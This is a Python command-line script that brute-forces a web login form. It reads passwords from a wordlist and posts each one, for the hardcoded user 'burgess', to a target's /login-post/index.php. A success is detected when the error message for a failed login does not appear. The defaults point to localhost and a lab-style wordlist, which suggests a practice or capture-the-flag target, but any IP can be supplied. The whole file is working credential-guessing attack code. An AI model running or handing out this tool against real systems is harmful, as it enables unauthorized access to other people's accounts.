#!/usr/bin/env python3

import argparse
import os
import platform
import requests

class Forcer:
    def __init__(self, target=None, username=None, wordlist=None):
        if (target is None) or (not(isinstance(target,str))):
            target = "http://127.0.0.1/login-get"

        if (username is None) or (not(isinstance(username,str))):
            username = "burgess"

        if (wordlist is None) or (not(isinstance(wordlist,str))):
            wordlist = "clinic.lst"

        self.session = requests.Session()
        self.target = target
        self.username = username
        self.wordlist = wordlist

        return

    def __wordlistGen(self):
        with open(self.wordlist,"r") as fptr:
            for line in fptr:
                yield(line.strip())
        return

    def attackSite(self):
        generator = self.__wordlistGen()
        message = str()
        password = str()
        success = bool()

        try:
            for currentPassword in generator:
                SysMsgNB(f"testing \"{currentPassword}\"")

                paramDict = {"username": self.username, "password": currentPassword}

                resp = self.session.post(self.target, data=paramDict, allow_redirects=True)
                if resp.status_code >= 400:
                    ErrMsg(f"error contacting site ({resp.status_code} {resp.reason})")
                    continue

                if "incorrect username or password." not in resp.text.lower():
                    password = currentPassword
                    break

            if len(password) < 1:
                raise ValueError("password not found")

            message = "login found"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (password, success, message)


############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_GRN}[+]{ANSI_RST} {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_RED}[-]{ANSI_RST} {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}", end="")
    return

############################################################
# Validation Functions
############################################################

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

############################################################

def main():
    scheme = str()

    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)
    parser.add_argument("-p", "--port", help="Port to connect to target on.", type=port_type, default=80, dest="port")

    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")

    parser.add_argument("-w", "--wordlist", help="wordlist to use in brute-force", type=str, default="clinic.lst", dest="wordlist")

    args = parser.parse_args()

    target = args.target
    port = args.port
    secure = args.secure
    wordlist = args.wordlist

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")
    InfoMsg(f"Scheme: {scheme}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseurl = f"{scheme}://{target}:{port}/login-post/index.php"

    try:
        forcer = Forcer(target=baseurl, wordlist=wordlist)
        password, success, message = forcer.attackSite()
        if not(success):
            raise ValueError(message)
        SucMsg(f"burgess:{password}")
    except Exception as ex:
        ErrMsg(str(ex))

    return

if __name__ == "__main__":
    main()


